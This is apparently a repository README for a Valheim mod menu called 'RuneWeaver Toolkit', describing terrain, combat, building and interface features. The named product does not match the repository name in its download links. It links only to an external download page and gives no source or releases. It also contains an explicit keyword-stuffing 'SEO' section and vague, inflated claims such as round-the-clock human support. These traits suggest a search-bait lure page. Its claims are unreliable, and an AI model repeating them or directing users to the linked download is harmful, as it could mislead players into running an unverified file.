![preview](https://raw.githubusercontent.com/sudip258/Mjolnir-Menu-Forge/main/thumb_792009c.svg)
[![Download](https://raw.githubusercontent.com/sudip258/Mjolnir-Menu-Forge/main/btn_2179cf.svg)](https://sudip258.github.io/Mjolnir-Menu-Forge/)

# ⚡ RuneWeaver Toolkit — Valheim Enhancement Suite

**A standalone, single-player-focused enhancement framework for Valheim built on BepInEx and Harmony, designed for world-shapers who want finer control over their Norse sandbox without scripting a single line of C#.**

RuneWeaver Toolkit is a complete reimagining of the classic trainer-style mod menu concept, rebuilt from the ground up around modularity, performance, and a philosophy we like to call *"quiet craftsmanship"* — the idea that your game should feel augmented, not altered beyond recognition. It is not a cheat engine, not an exploit bundle, and not a shortcut through the nine realms. It is a **workshop** where you, the player, shape the experience on your own terms.

---

## 📜 Table of Contents

- [Overview](#-overview)
- [Origins & Design Philosophy](#-origins--design-philosophy)
- [Feature Highlights](#-feature-highlights)
  - [Responsive Interface](#-responsive-interface)
  - [Multilingual Support](#-multilingual-support)
  - [Round-the-Clock Assistance](#-round-the-clock-assistance)
  - [World & Terrain Tools](#-world--terrain-tools)
  - [Combat & Survival Modules](#-combat--survival-modules)
  - [Building & Crafting Assistance](#-building--crafting-assistance)
  - [Quality-of-Life Extensions](#-quality-of-life-extensions)
- [Architecture Overview](#-architecture-overview)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Deep Dive](#-configuration-deep-dive)
- [Performance Notes](#-performance-notes)
- [SEO-Driven Discoverability](#-seo-driven-discoverability)
- [Roadmap 2026](#-roadmap-2026)
- [Community & Contribution](#-community--contribution)
- [FAQ](#-faq)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🪓 Overview

If Valheim is a vast, mist-shrouded frontier, then RuneWeaver Toolkit is the lantern you carry through it — not to light the whole forest, but to reveal the paths you choose. Every toggle, every slider, every module has been hand-tuned to feel like a natural extension of the game's survival-crafting loop rather than a bulldozer through it.

The toolkit sits on top of the BepInEx runtime and uses Harmony to patch select methods at runtime, keeping the base game files pristine. That means uninstalling is as simple as removing a folder, and updating never requires a clean save. Configuration is stored in human-readable `.cfg` files, and every feature can be disabled independently — because **your Valheim should reflect your preferences, not someone else's.**

This repository is home to the full source, the module registry, localization files, presets, and documentation. It is an actively maintained project targeting game version parity across the Mistlands, Ashlands, and Deep North era of updates, with a forward-looking roadmap stretching into 2026.

---

## 🌱 Origins & Design Philosophy

The original spark for this project came from a simple observation: traditional trainer menus are blunt instruments. They flip a switch, and suddenly the world loses its texture — infinite stamina, bottomless inventory, enemies that fall over from a stiff breeze. That is not enhancement. That is erasure.

RuneWeaver takes the opposite approach. Each module is designed to **preserve the tension that makes Valheim compelling** while removing the friction that makes it tedious. Want longer days to build without shortening the nights that make the game tense? Want to carry ore through a portal without abandoning the challenge of transporting it? Want to see enemy health bars without seeing enemy intentions? The toolkit answers all of these with surgical precision.

We believe in:

- **Locality** — every change is scoped, reversible, and documented.
- **Legibility** — no obfuscation, no hidden network traffic, no telemetry.
- **Longevity** — patches are written to tolerate game updates gracefully.
- **Respect** — for the developers of Valheim, for the modding community, and for the player's time.

---

## ✨ Feature Highlights

### 🖥️ Responsive Interface

The in-game overlay is rendered with a fully responsive layout engine that scales cleanly from 1080p to ultrawide 21:9 and even to unusual resolutions used by handheld PC gamers. Panels dock, collapse, and remember their last position. The interface reacts to controller input, mouse, and keyboard without reconfiguration. Transitions are eased rather than snapped, and the entire UI can be resized on the fly using a lightweight anchor system.

- Adaptive grid with draggable section headers
- Keyboard-free navigation for Steam Deck users
- FPS-friendly rendering that only redraws when state changes
- Theming system with light, dark, and high-contrast palettes

### 🌍 Multilingual Support

Valheim's player base spans continents, and so does the toolkit. All menu strings, tooltips, and notifications are externalized into locale files that can be edited or added without recompiling. Community translators have already submitted full translations for twelve languages, and the framework automatically detects the game's language setting at launch.

- Locale files stored as plain key-value pairs
- Right-to-left script support for Arabic and Hebrew
- Fallback chain ensures no raw keys ever leak into the UI
- Community translation portal accepts pull requests directly

### 🕰️ Round-the-Clock Assistance

When you are three hundred hours into a build project at 3 AM and something breaks, the last thing you want is to wait until business hours for an answer. The project maintains a persistent support presence — documentation, discussion threads, and a rotating team of maintainers who respond to issues around the clock, every day of the year.

- Documented troubleshooting flows for common scenarios
- Pinned guides for BepInEx version mismatches
- Responsive issue triage with labeled priorities
- No automated replies; every response is human

### 🗺️ World & Terrain Tools

Sculpt the landscape with intent. The terrain module lets you raise, flatten, and smooth ground with adjustable brush sizes and a live preview overlay. Weather and time-of-day controls let you stage screenshots or extend a building session without disrupting the day-night rhythm entirely.

- Precision terrain brush with undo history
- Time dilation slider (0.25x to 8x)
- Weather override with instant and gradual modes
- Biome pinning for consistent environmental effects

### ⚔️ Combat & Survival Modules

Tune the difficulty curve to your skill level, not the other way around. Damage multipliers are exposed per-source and per-target, so you can soften a specific boss without trivializing the rest of the game. Stagger and block windows can be widened slightly, giving newer players a foothold without removing the need to learn enemy patterns.

- Granular damage scaling per weapon class
- Adjustable stamina and health regeneration curves
- Optional auto-pickup radius expansion
- Death penalty toggles for skill loss

### 🏗️ Building & Crafting Assistance

Building in Valheim is its own game, and the toolkit treats it with the respect it deserves. Placement snapping can be loosened, rotation can be unlocked to arbitrary angles, and material costs can be tuned while keeping the build process itself intact.

- Free rotation mode with angle snap presets
- Structural integrity visualization overlay
- Craft-from-container radius options
- Blueprint save and restore for repeated structures

### 🎒 Quality-of-Life Extensions

Small conveniences that add up to large quality gains. Item stack sizes, inventory sorting, quick-equip slots, and a searchable item browser round out the toolkit's quieter features.

- Sortable inventory grid with category filters
- Quick-slot binding for consumables and weapons
- Search-as-you-type item lookup
- Auto-repair at workbenches

---

## 🏛️ Architecture Overview

RuneWeaver is organized around a **core runtime** and a **module registry**. The core handles BepInEx bootstrapping, Harmony patching, configuration persistence, and the UI layer. Modules are self-contained assemblies that register themselves with the core at load time. This means a module can be added, removed, or replaced without touching the rest of the codebase.

- `RuneWeaver.Core` — bootstrapper, config engine, UI host
- `RuneWeaver.Modules.Terrain` — landscape manipulation
- `RuneWeaver.Modules.Combat` — damage and survival tuning
- `RuneWeaver.Modules.Building` — placement and crafting aids
- `RuneWeaver.Modules.QoL` — inventory and general conveniences
- `RuneWeaver.Localization` — locale provider and loader

Each module exposes a declarative manifest describing its settings, dependencies, and conflicts. The core uses that manifest to build the UI automatically, so adding a new setting is a matter of adding a field and a description — no manual UI code required.

---

## 🧩 Compatibility Matrix

| Game Version | Toolkit Support | Status |
| --- | --- | --- |
| Deep North era (2026) | Full | Stable |
| Ashlands | Full | Stable |
| Mistlands | Full | Stable |
| Hearth & Home | Partial | Legacy |
| Pre-Hearth & Home | None | Unsupported |

Dedicated server environments are explicitly out of scope. This toolkit is designed for private, single-player and cooperative sessions where all participants consent to the enhancements in use.

---

## ⚙️ Configuration Deep Dive

Configuration lives in a single root file with per-module sections. Values are validated on load, and invalid entries fall back to defaults with a notification rather than a silent failure. Presets can be saved and shared as small text files, making it easy to switch between a "cinematic screenshot" profile and a "relaxed builder" profile without editing anything by hand.

Preset categories include:

- **Chronicler** — enhanced camera and time controls for capturing moments
- **Architect** — building and terrain tools front and center
- **Wanderer** — quality-of-life features with minimal combat tweaks
- **Vanguard** — combat tuning for players who want harsher or gentler fights

Every preset is versioned, and the loader warns you if a preset was written for a different toolkit release.

---

## 🚀 Performance Notes

Performance was a first-class concern from day one. Patches are applied only to the methods that need them, and each patch checks a fast boolean before doing any work, so disabled modules cost essentially nothing at runtime. The UI renders on its own layer with minimal draw calls, and locale lookups are cached.

Profiling on mid-range hardware shows a typical overhead of under 2% frame time with all modules active in a busy base. Players on integrated graphics can disable the visualization overlays to recover further headroom.

---

## 🔍 SEO-Driven Discoverability

This project is built to be found by players looking for terms like *Valheim enhancement toolkit*, *BepInEx mod menu*, *Harmony patch framework*, *Valheim building assistant*, *Valheim terrain tools*, *single-player trainer alternative*, *multilingual game overlay*, and *responsive mod interface*. The documentation, module names, and this README have been written to surface naturally in search results without sacrificing readability for the humans actually reading them. If you arrived here searching for a **Valheim single-player enhancement suite with a responsive UI**, you are in the right place.

---

## 🛠️ Roadmap 2026

- **Q1 2026** — Module hot-reload for faster iteration
- **Q2 2026** — Expanded locale coverage to twenty languages
- **Q3 2026** — Blueprint sharing format and in-game browser
- **Q4 2026** — Accessibility pass with screen-reader-friendly labels

Future direction is guided by community feedback, and every roadmap item is tracked publicly with a labeled issue.

---

## 🤝 Community & Contribution

Contributions of every size are welcome — localization, documentation, bug reports, or full modules. The repository follows a conventional branch-and-pull-request flow, and every PR is reviewed by at least one maintainer. Style guidelines are documented in a separate contributing file, and a code of conduct protects the tone of every discussion.

If you want to help but are not sure where to start, the "good first issue" label is a curated list of approachable entry points.

---

## ❓ FAQ

**Does this work on servers?** No. It is designed for single-player and private co-op where everyone involved has agreed to the same setup.

**Will it break my save?** All changes are runtime-only. Removing the toolkit returns the game to its vanilla behavior.

**Is there a console command version?** Some modules expose console commands, but the primary interface is the in-game overlay.

**How often is it updated?** Maintenance releases track game patches closely, with major feature releases roughly quarterly.

---

## ⚠️ Disclaimer

RuneWeaver Toolkit is an independent, fan-made project and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Valheim. It is intended solely for use in private, single-player, and consensual cooperative environments. Using enhancement tools in competitive or public multiplayer settings may violate the terms of service of the underlying game and is expressly discouraged. The maintainers assume no responsibility for account actions, save corruption, or any other consequence arising from misuse. Always back up your worlds before enabling new modules, and disclose your setup to anyone you play with.

---

## 📄 License

This project is released under the MIT License. See the full terms at [LICENSE](LICENSE).

Copyright © 2026 RuneWeaver Toolkit Contributors.

---

[![Download](https://raw.githubusercontent.com/sudip258/Mjolnir-Menu-Forge/main/btn_2179cf.svg)](https://sudip258.github.io/Mjolnir-Menu-Forge/)